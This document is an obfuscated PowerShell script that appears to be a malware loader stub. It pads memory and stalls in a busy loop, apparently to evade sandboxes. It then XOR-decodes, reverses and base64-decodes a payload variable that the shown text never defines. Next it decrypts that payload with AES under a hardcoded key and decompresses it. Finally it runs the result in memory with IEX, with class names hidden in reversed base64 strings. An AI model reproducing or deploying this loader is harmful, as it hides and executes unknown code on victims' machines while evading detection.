$zrtwjrkzjzgssg = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($zrtwjrkzjzgssg -lt 250) { $sttwgpvwjqwtxjx = "a" * 300MB }
$zhkwrikyqrggkris = 0
$srsrvnyqrjzimrnwp = 30000000
For ($zhkwrikyqrggkris=0; $zhkwrikyqrggkris -lt $srsrvnyqrjzimrnwp;$zhkwrikyqrggkris++) { $zhkwrikyqrggkris++ }
$tqozormuuomjt = [System.Text.Encoding]::UTF8.GetBytes("jkmxrtkgwyxhrqinz")
$mkzqnwijyjnnpzjj = [System.Text.Encoding]::UTF8.GetBytes($vujkqkjynk)
$jvpxyosvvuvxrj = $(for ($vipynizvvw = 0; $vipynizvvw -lt $mkzqnwijyjnnpzjj.length; ) {
    for ($oyxkysrtskugwyrzh = 0; $oyxkysrtskugwyrzh -lt $tqozormuuomjt.length; $oyxkysrtskugwyrzh++) {
        $mkzqnwijyjnnpzjj[$vipynizvvw] -bxor $tqozormuuomjt[$oyxkysrtskugwyrzh]
        $vipynizvvw++
        if ($vipynizvvw -ge $mkzqnwijyjnnpzjj.Length) {
            $oyxkysrtskugwyrzh = $tqozormuuomjt.length
        }
    }
})
$jvpxyosvvuvxrj = [System.Text.Encoding]::UTF8.GetString($jvpxyosvvuvxrj)
$ipjutjostwqgzhgz = "$jvpxyosvvuvxrj"
$jwzjgjyhytgokszz = $ipjutjostwqgzhgz.ToCharArray()
[array]::Reverse($jwzjgjyhytgokszz)
$njvtkmtzpzktsz = -join($jwzjgjyhytgokszz)
$ghiqqigmisopx = [System.Convert]::FromBase64String("$njvtkmtzpzktsz")
$wynvxuppgy = [System.Convert]::FromBase64String("erH3j7/sqVzA60smwfWKEIsKiHo5VBF5lg/i/ob/66s=")
$sjhhoykyukiw = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$ixwythngkhugskq = $sjhhoykyukiw.ToCharArray()
[array]::Reverse($ixwythngkhugskq)
$svxmtiipuqwoy = -join($ixwythngkhugskq)
$zrugjkuyhzmwsh = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($svxmtiipuqwoy))
$iswxymtkivjzpoyi = New-Object "$zrugjkuyhzmwsh"
$rwzuhnxvtoqitwzj = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$tquixvkjojnrnvit = $rwzuhnxvtoqitwzj.ToCharArray()
[array]::Reverse($tquixvkjojnrnvit)
$hxjmpjsnxiriurw = -join($tquixvkjojnrnvit)
$iyxzrmoxqhvi = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hxjmpjsnxiriurw))
$nsyvtgyugsupjpown = & ([scriptblock]::Create($iyxzrmoxqhvi))
$iswxymtkivjzpoyi.Mode = $nsyvtgyugsupjpown
$kzqqqukwsvuq = "==wcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$nrkmkuixpwt = $kzqqqukwsvuq.ToCharArray()
[array]::Reverse($nrkmkuixpwt)
$ngoywhnhqrnrgvhk = -join($nrkmkuixpwt)
$xtyiozgkmm = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ngoywhnhqrnrgvhk))
$vyhssxytnsyghhx = & ([scriptblock]::Create($xtyiozgkmm))
$iswxymtkivjzpoyi.Padding = $vyhssxytnsyghhx
$iswxymtkivjzpoyi.BlockSize = 128
$iswxymtkivjzpoyi.KeySize = 256
$iswxymtkivjzpoyi.Key = $wynvxuppgy
$iswxymtkivjzpoyi.IV = $ghiqqigmisopx[0..15]
$tjgjmmtswjvquuzs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$gsixqhqzooqort = New-Object $tjgjmmtswjvquuzs(,$iswxymtkivjzpoyi.CreateDecryptor().TransformFinalBlock($ghiqqigmisopx,16,$ghiqqigmisopx.Length-16))
$kmpowjjnwh = New-Object $tjgjmmtswjvquuzs
$mmytiqhyisphgupq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
$zryxkvyzkpioj = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
$rmthzvqkxyg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))
$yznvpjuxxjzjx = New-Object $rmthzvqkxyg $gsixqhqzooqort, ($zryxkvyzkpioj::$mmytiqhyisphgupq)
$yznvpjuxxjzjx.CopyTo($kmpowjjnwh)
$yznvpjuxxjzjx.Close()
$iswxymtkivjzpoyi.Dispose()
$gsixqhqzooqort.Close()
$qwthpsrpstzki = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$wuhvzizgrvxkz = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$gxomigjumhmvnooxq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$jvizkyuzuiizuwxw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$xkipjymwnyvuy = $qwthpsrpstzki::$wuhvzizgrvxkz.$jvizkyuzuiizuwxw($kmpowjjnwh.$gxomigjumhmvnooxq())
IEX($xkipjymwnyvuy)